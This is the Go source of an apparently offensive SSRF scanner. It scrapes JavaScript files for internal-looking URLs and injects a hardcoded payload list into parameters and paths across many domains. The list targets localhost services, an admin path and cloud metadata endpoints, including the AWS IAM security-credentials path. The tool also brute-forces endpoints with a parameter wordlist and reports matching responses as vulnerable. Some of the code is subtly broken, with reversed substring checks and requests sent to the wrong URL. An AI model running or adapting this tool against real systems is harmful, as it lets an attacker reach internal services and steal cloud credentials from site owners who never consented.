package main

import (
"regexp"
"fmt"
"time"
"sync"
"bufio"
"os"
"strings"
"io/ioutil"
"net/http"
"net/url"
"flag"
"github.com/briandowns/spinner"
"github.com/projectdiscovery/gologger"
. "github.com/logrusorgru/aurora"
)


func main () {

	banner:=`


 _____ _____ _____ _____
|   __|   __| __  |   __|
|__   |__   |    -|   __|
|_____|_____|__|__|__|
    1.0 - @z0idsec

        `

	gologger.Printf("%s\n\n", banner)
	gologger.Infof("Use with caution. You are responsible for your actions\n")
	gologger.Infof("Developers assume no liability and are not responsible for any misuse or damage.\n\n")


	var concurrency int
	var payloads string
	var match string
	var matchList string
	var appendMode bool
	var paths bool
	var silent bool
	var wordlist bool
	var brute bool
	var domains string
	var paramsList string
	flag.IntVar(&concurrency, "concurrency", 30, "Set the concurrency for greater speeds")
	flag.StringVar(&domains, "domains", "", "The list of subdomains")
	flag.StringVar(&paramsList, "parameters", "", "The parameters list")
	flag.StringVar(&payloads, "payloads", "", "The payloads list")
	flag.StringVar(&match, "pattern", "", "Match the response with a pattern (e.g.) 'Success:'")
	flag.StringVar(&matchList, "patterns", "", "Match the response with a list of patterns")
	flag.BoolVar(&appendMode, "append", false, "Append the payload to the parameter")
	flag.BoolVar(&paths, "paths", false, "(true or false) for testing paths or parameters")
	flag.BoolVar(&wordlist, "gen", false, "Generate a SSRF wordlist to be used")
	flag.BoolVar(&brute, "brute", false, "Brute force parameters against endpoints to find SSRF")
	flag.BoolVar(&silent, "silent", false, "silent output")
	flag.Parse()

	if wordlist == true {
		
		// Generate the wordlist for ssrf testing
		generate_wordlist()

	}else {
		
		// Check to see if these flags are used 
		if (payloads != ""  && domains != "") || (match != "" || matchList != "") {

         	        s := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
               		s.Suffix =" Please be patient"
                	s.Start()
                	s.Color("red") // Set the spinner color to red
                	time.Sleep(time.Second * 2)
                	s.Stop()
               		// Continue Create the goroutine
                	var wg sync.WaitGroup
                	for i:=0; i<=concurrency; i++ {
                       		wg.Add(1)
                        	go func () {

					// Test For SSRF
                                	test_ssrf(domains, paramsList, payloads, match, matchList, appendMode, silent, paths, brute)

                                	wg.Done()
                        	}()
                        	wg.Wait()
                	}
		}
	}
}


// Save the wordlist
func save_to_file(data []string, suffix string, filename string) {
 	
	s := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
        s.Suffix = suffix
        s.Start()
        s.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)


	f,err:=os.Create(filename)
	if err != nil {
		fmt.Println(Bold(Red(err)))
		return
	}
	for _,v := range data {
		_,err := f.WriteString(v + "\n")
		if err != nil {
			fmt.Println(Bold(Red(err)))
			f.Close()
			return
		}
	}
	f.Close()
	s.Stop()
}

// Search through all javascript for domains
func search_for_links() []string {

	var links=make([]string, 0)
	var jsFiles=make([]string, 0)
	client:= &http.Client{}
	

	scanner:=bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		jsLink:=scanner.Text()
		jsFiles=append(jsFiles, jsLink)

		req,err:=http.NewRequest("GET", jsLink,nil)
		if err != nil {
			return nil
		}

		resp,err:=client.Do(req)
		if err != nil {
			return nil
		}

		bodyBuffer,err:=ioutil.ReadAll(resp.Body)
		if err != nil {
			return nil
		}

		// The body to grep for
		bodyString:=string(bodyBuffer)

		// Search for all links
		re:=regexp.MustCompile(`(https?|ftp|file)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]`)
		matches:=re.FindStringSubmatch(bodyString)
		if matches != nil {

			// Check for internal domains in js
			if strings.Contains("internal", matches[0]) {
				links=append(links, matches[0])
			}
			if strings.Contains("prod", matches[0]) {
                                links=append(links, matches[0])
                        }
			if strings.Contains("jira", matches[0]) {
                                links=append(links, matches[0])
                        }
			if strings.Contains("corp", matches[0]) {
                                links=append(links, matches[0])
                        }
			if strings.Contains("uat", matches[0]) {
                                links=append(links, matches[0])
                        }
		}
	}

	// Append some other payloads
        links=append(links, "http://example.com")
        links=append(links, "http://127.0.0.1:80")
        links=append(links, "http://127.0.0.1:443")
        links=append(links, "http://127.0.0.1:22")
        links=append(links, "https://localhost/admin")
        links=append(links, "http://[::]:22/")
        links=append(links, "http://169.254.169.254")
        links=append(links, "http://169.254.169.254/computeMetadata/v1/")
      	links=append(links, "169.254.169.254/latest/meta-data/iam/security-credentials/flaws/")
	links=append(links, "example.com")
        links=append(links, "127.0.0.1:80")
        links=append(links, "169.254.169.254/computeMetadata/v1/")
        links=append(links, "127.0.0.1:443")
        links=append(links, "127.0.0.1:22")
        links=append(links, "localhost/admin")
        links=append(links, "169.254.169.254")
        links=append(links, "[::]:22/")

	// Save the JS files.
	save_to_file(jsFiles, " Saving JS Files for later use", "jsfiles.txt")

	return links
}



// Search endpoints & parameters, test for ssrf
func fetch_endpoints_params(payload string, currUrl string, paramsFile string, silent bool, matches string, match string)  {

	var endpoints  = make([]string, 0)

	client:=&http.Client{}

	s := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
        s.Suffix = " Searching endpoints & parameters"
        s.Start()
        s.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)
	s.Stop()
	jsFile,err := os.Open("jsfiles.txt")
	if err != nil {
		fmt.Println(Bold(Red("[!] Could not read file (maybe permission issue)")))
		return
	}
	jsScanner := bufio.NewScanner(jsFile)
	for jsScanner.Scan() {
		jsLink:=jsScanner.Text()
		req,err:=http.NewRequest("GET", jsLink, nil)
		if err != nil {
			return
		}
		resp,err:= client.Do(req)
		if err != nil {
			return
		}
		bodyBytes,err:=ioutil.ReadAll(resp.Body)
		if err != nil {
			return
		}
		bodyString:=string(bodyBytes)
		
		 // Search for all links
                re:=regexp.MustCompile(`(https?|ftp|file)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]`)
                matches:=re.FindStringSubmatch(bodyString)		
		if matches != nil {
			u,_ := url.Parse(matches[0])
			endpoints=append(endpoints, u.Path)
		}
	}	
	save_to_file(endpoints, " Saving Endpoints to endpoints.txt", "endpoints.txt")

	// Brute Force for SSRF
	brute_force_for_ssrf(payload, currUrl, "endpoints.txt", paramsFile, matches, match, silent)
}

// Generate the wordlist from javascript
func generate_wordlist() {

        s := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
        s.Suffix =" Generating SSRF wordlist"
        s.Start()
        s.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)
        s.Stop()

        payloads:=search_for_links()
        fmt.Println(Sprintf(Cyan("SSRF Wordlist is %d lines"), Red(len(payloads))))
        save_to_file(payloads, " Saving wordlist as ssrf.txt", "ssrf.txt")
}

// Brute forces for SSRF vulnerabilities
func brute_force_for_ssrf(payload string, url string, endpoints string, parameters string, matches string, match string, silent bool) {
	endpointsF,err:=os.Open(endpoints)
	if err != nil { return }
	parametersF,err:= os.Open(parameters)
	if err != nil { return }


	es := bufio.NewScanner(endpointsF)
	ps := bufio.NewScanner(parametersF)

	for es.Scan (){
		for ps.Scan() {

			newLink:=url+"/"+es.Text()+"/?"+ps.Text()+"="+payload
	
			if silent == false {
            			fmt.Println(Bold(Red(">")), Bold(White(" Testing ")), Bold(White(newLink)))
       			}
   			client:=&http.Client{}
      			req,err:=http.NewRequest("GET", url, nil)
      			if err != nil {
          			return
        		}

        		resp,err:=client.Do(req)
        		if err != nil {
        		      	return
        		}

       			bodyBytes,err  := ioutil.ReadAll(resp.Body)
        		if err != nil {
        			return
       			}
        		bodyString := string(bodyBytes)
			if match != "" {

				if strings.Contains(bodyString, match) {
        				fmt.Println(Bold(Cyan(bodyString)))
                			fmt.Println(Bold(Red("VULNERABLE: " + url)))
				}
        		}
			if matches != "" {
				file,err:=os.Open(matches)
				if err != nil { return }
				scanner:=bufio.NewScanner(file)
				for scanner.Scan() {
					if strings.Contains(bodyString, scanner.Text()) {
                        			fmt.Println(Bold(Cyan(bodyString)))
                                		fmt.Println(Bold(Red("VULNERABLE: " + url)))
						
            				}
				}
			}
		}
	}
}


// This is used to test for ssrf
func test_ssrf(domains string, paramsFile string, payloads string, match string, matchList string, appendMode bool, silent bool, paths bool, brute bool) {
	
	payloadList :=make([]string, 0)
	links := make([]string, 0)

	file,err:=os.Open(payloads)
	if err != nil {
		return
	}
	time.Sleep(time.Millisecond * 10)
	domainsF,err:=os.Open(domains)
	if err != nil { return }
	scanner:=bufio.NewScanner(domainsF)
	pScanner:=bufio.NewScanner(file)
	
	s := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
        s.Suffix =" Generating links to test"
        s.Start()
        s.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)

	for {
		scanner.Scan()
		text:=scanner.Text()
		if len(text) != 0 {
			links = append(links,text)
		}else {
			break
		}
	}
	s.Stop()

	
        s1 := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
        s1.Suffix =" Generating Payloads from list"
        s1.Start()
        s1.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)

	for {

		pScanner.Scan()
                text:=pScanner.Text()
                if len(text) != 0 {
                       	payloadList = append(payloadList,text)
                }else {
                        break
                }

	}
	s1.Stop()

	for _,l:=range links {
		for _,p:= range payloadList {
			link:=l			
			payload:=p
			u,err := url.Parse(link)
			if err != nil {
				fmt.Println(Bold(Red(">")), err)
			}
			if brute == true {
				if paramsFile == "" {
					fmt.Println(Bold(Red("> Make sure to specify the parameters wordlist")))
					os.Exit(1)
				}
				generate_wordlist()

				// BruteForce For SSRF
				fetch_endpoints_params(payload, link, paramsFile, silent, matchList, match)			

			}
			if paths == false {

				qs:=url.Values{} 
				for param, vv := range u.Query() {
					if appendMode == true {
						qs.Set(param, vv[0]+payload)
						u.RawQuery = qs.Encode()
                  		              	if silent == false {
							 fmt.Println(Bold(Red(">")), Bold(White(" Testing ")), Bold(White(u)))
                                	      	}
                                		make_request(u.String(), match, matchList)

					}else {
						qs.Set(param, payload)

						u.RawQuery = qs.Encode()
                                		if silent == false {
							fmt.Println(Bold(Red(">")), Bold(White(" Testing ")), Bold(White(u)))
                                		}
        		                        make_request(u.String(), match, matchList)
					}
				}					

			}else {

				newLink:=link+"/"+payload
				if silent == false {
					fmt.Println(Bold(Red(">")), Bold(White(" Testing ")), Bold(White(newLink)))
                                }
                                make_request(newLink, match, matchList)

			}
		}
	}
	os.Exit(1)
}


// Making a request checking the output for vulnerabilities
func make_request(url string, match string, matchList string) {
	
	client:=&http.Client{}
	req,err:=http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}
	
	resp,err:=client.Do(req)
	if err != nil {
		return
	}

	if match != "" {

		bodyBytes,err  := ioutil.ReadAll(resp.Body)
		if err != nil {
			return
		}
		bodyString := string(bodyBytes)
		if strings.Contains(bodyString, match) {
			fmt.Println(Bold(Cyan(bodyString)))
			fmt.Println(Bold(Red("VULNERABLE: " + url)))
		}
	}else {

		bodyBytes,err  := ioutil.ReadAll(resp.Body)
                if err != nil {
                        return
                }
		bodyString := string(bodyBytes)

		mF,err := os.Open(matchList)
		if err != nil {
			return
		}
		defer mF.Close()
		mScanner:=bufio.NewScanner(mF)

		for mScanner.Scan() {
	                if strings.Contains(bodyString, mScanner.Text()) {
        	                fmt.Println(Bold(Cyan(bodyString)))
                	        fmt.Println(Bold(Red("VULNERABLE: " + url)))
                	}
		}
	}
}
